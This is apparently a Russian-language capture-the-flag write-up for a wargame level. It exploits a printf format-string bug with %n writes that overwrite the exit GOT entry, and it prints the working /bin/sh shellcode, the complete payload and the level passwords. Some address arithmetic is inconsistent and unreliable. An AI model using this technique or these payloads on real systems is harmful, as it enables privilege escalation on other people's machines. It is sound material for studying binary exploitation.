## HowTo

```bash
> su level05
3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
```

### Инструменты:
- Ida Pro + hex rays
- gdb + peda


**NB:** Для работы с файлом стягиваем его на локальную машину

### Анализ и ход решения
1. В си-представлении видно, что бинарь не содержит скрытых функций или чего-то другого, 
что мы могли бы использовать
2. По сути, мы имеем функцию to_upper, которая в конце работы печатает получившийся буффер через `printf`
3. После печати происходит выход через `exit()`
4. Анализ asm показывает, что используется динамическая линковка

[обзорная статья про взломы PLT, GOT](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)
```bash
(gdb) disass exit
Dump of assembler code for function exit@plt:
   0x08048370 <+0>:	jmp    *0x80497e0
   0x08048376 <+6>:	push   $0x18
   0x0804837b <+11>:	jmp    0x8048330
```

`exit@plt` - динамическая линковка функции, на старте исполнения `+0` 
происходит обращение к `GOT` (`Global offset table`) для поиска адреса функции в `libc`. 
`jmp *0x80497e0` означает, что наша функция находится по этом адресу


5. Также мы знаем, что `printf` имеет уязвимость с модификатором `%n` - 
передав указатель мы можем записать число напечатанных символов в адрес

**Идея взлома**
- использовать переменную окружения для размещения шелкода
- подменить адрес по адресу `*0x80497e0` указатель на `exit` на указатель на наш шеллкод
- будем использовать шеллкод, вызывающий `system(/bin/sh)`

### Ход взлома
1. Готовим шеллкод, используем массив NOP-инструкций для упрощения адресации
```bash
export SHELLCODE=`python -c 'print("\x90" * 0xffff + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")'`
```
2. Мы уже знает адрес `exit` - `*0x80497e0`
3. Найдем позицию буффера, среди аргументов `printf`

обнаруживаем начало буфера на 10-м индексе
```bash
> for ((i=1; i<20;i++)); do echo "idx $i" && ./level05 <<< "aaaabbbb %$i\$x"; done
...
index 10
aaaabbbbcccc 61616161
index 11
aaaabbbbcccc 62626262
index 12
aaaabbbbcccc 63636363
...
```

4. Надем адрес переменнй с шеллкодом (за счет большого числа nop-инструкций, у нас диапозон адресов)
```bash
> b *main+1
> run
> x/50s *((char**)environ)
...
0xfffdd802 - 0xfffe4ada
...
```

5. Любой из этих адресов в инт-представлении слишком велик, чтобы поместиться в 4 байта (у нас 32-система).
Поэтому попробуем разбить его на старший и младший бит и использовать уязвимость `%n` дважды
6. Старший бит для адреса exit `\xe0\x97\x04\x08`, младший - `\xe2\x97\x04\x08` (`e2-e0`)
7. Выберем произвольный адрес из диапозона `0xfffdd802 - 0xfffdfcba: 0xffffef808`
8. Разобьем его на старший и младший биты. Из младшего вычтем 8 байт,
т.к. мы записываем 1 адрес и не хотим учитывать 8 байт давжды
```bash
0xffffef808
f808 - 8 == 63496 - 8 == 63488

fffe = 65534
65534 - 63496 == 2038 (вычтем первый заполнитель) 
```

9. Готовим payload
- `"\xe0\x97\x04\x08"` - старший бит адреса exit
- `"\xe2\x97\x04\x08"` - младший бит адреса exit
- `"%63488d%10$hn"` - первый аргумент. `10` позиция, `%hn` - используем `h` для явного указания размера указателя
- `"%2038d%11$hn"` - второй агрумент. `11` позиция

```bash
(python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%63488d%10$hn" + "%2038d%11$hn")'; cat) | ./level05
> whoami
level06
> pwd
/home/users/level05
> cd ../level06	
> cat .pass
h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
```
